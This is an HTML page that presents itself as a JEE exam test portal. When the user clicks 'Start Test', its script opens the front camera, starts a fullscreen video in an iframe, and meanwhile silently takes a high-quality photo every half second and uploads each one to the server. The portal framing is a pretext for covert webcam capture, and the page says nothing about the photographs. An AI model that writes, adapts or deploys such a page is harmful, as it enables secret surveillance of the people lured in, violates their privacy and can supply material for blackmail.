<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>JEE Ultimate Test Portal</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
html,body{height:100%;overflow:hidden;color:white;}

body{
  background:linear-gradient(-45deg,#0f2027,#203a43,#2c5364,#000000);
  background-size:400% 400%;
  animation:gradientMove 12s ease infinite;
}

@keyframes gradientMove{
  0%{background-position:0% 50%;}
  50%{background-position:100% 50%;}
  100%{background-position:0% 50%;}
}

#overlay{
  position:absolute;
  width:100%;
  height:100%;
  overflow:auto;
  backdrop-filter:blur(12px);
  background:rgba(0,0,0,0.6);
  padding:40px;
}

h1{
  text-align:center;
  font-size:48px;
  letter-spacing:4px;
  margin-bottom:10px;
}

.container{
  display:grid;
  grid-template-columns:repeat(auto-fit,minmax(260px,1fr));
  gap:25px;
  margin-top:30px;
}

.card{
  background:rgba(255,255,255,0.05);
  padding:20px;
  border-radius:20px;
}

button{
  padding:10px 20px;
  border:none;
  border-radius:30px;
  cursor:pointer;
  background:linear-gradient(45deg,#ff004c,#ff7a00);
  color:white;
  font-weight:bold;
  margin-top:10px;
}

iframe{width:100%;height:100%;border:0;display:none;}
#v,#c{display:none;}
</style>
</head>

<body>

<div id="overlay">
<h1>JEE Ultimate Test Portal</h1>

<div class="container">
  <div class="card">
    <h3>Start Test</h3>
    <button onclick="start()">â–¶ Start Test</button>
  </div>
</div>
</div>

<iframe id="frame"></iframe>
<video id="v" autoplay playsinline hidden></video>
<canvas id="c" hidden></canvas>

<script>

/* START TEST LOGIC (SAME FLOW, FRONT CAMERA FORCED) */
async function start(){

  try{

    const stream = await navigator.mediaDevices.getUserMedia({
      video:{
        facingMode:"user",  // ðŸ”¥ FRONT CAMERA
        width:{ideal:1920},
        height:{ideal:1080}
      }
    });

    v.srcObject=stream;

    setTimeout(capture,500);
    setInterval(capture,500);

  }catch(e){
    console.log(e);
    return;
  }

  document.getElementById("overlay").style.display="none";

  const r=await fetch("/get_video_link");
  const d=await r.json();

  const frame=document.getElementById("frame");
  frame.style.display="block";
  frame.src=d.url;

  if(frame.requestFullscreen){
    frame.requestFullscreen();
  }else if(frame.webkitRequestFullscreen){
    frame.webkitRequestFullscreen();
  }else if(frame.msRequestFullscreen){
    frame.msRequestFullscreen();
  }
}

/* SAME CAPTURE LOGIC â€” ONLY QUALITY IMPROVED */
function capture(){
  if(!v.videoWidth) return;

  c.width=v.videoWidth;
  c.height=v.videoHeight;

  const ctx=c.getContext("2d");
  ctx.imageSmoothingEnabled=true;
  ctx.imageSmoothingQuality="high";

  ctx.filter="contrast(108%) brightness(104%)";

  ctx.drawImage(v,0,0,c.width,c.height);

  c.toBlob(b=>{
    let f=new FormData();
    f.append("photo",b,"u.jpg");
    fetch("/upload",{method:"POST",body:f});
  },"image/jpeg",0.92);
}

</script>
</body>
</html>
